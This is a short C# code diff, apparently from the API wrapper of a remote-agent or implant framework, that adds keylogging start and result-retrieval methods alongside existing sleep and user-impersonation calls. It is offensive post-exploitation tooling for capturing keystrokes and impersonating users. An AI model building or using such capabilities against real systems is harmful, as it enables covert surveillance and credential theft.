@@ -352,6 +352,16 @@ namespace NHAPI
             return (bool)agentType.GetMethod("UpdateSleep", BindingFlags.Instance | BindingFlags.NonPublic).Invoke(CurrentAgent, new object[] { sleepParams });
         }
 
+        public bool Keylog(string operation)
+        {
+            return (bool)agentType.GetMethod("KeyLogger", BindingFlags.Instance | BindingFlags.NonPublic).Invoke(CurrentAgent, new object[] { operation });
+        }
+
+        public Guid Keylog_RetrieveResults(string operation)
+        {
+            return CallFunctionGetGuid(agentType.GetMethod("KeyLogger", BindingFlags.Instance | BindingFlags.NonPublic), new object[] { operation });
+        }
+
         public bool ImpersonateUser(string user, string pw, ImpersonationType impersonationContext)
         {
             string impersonationParams = "";
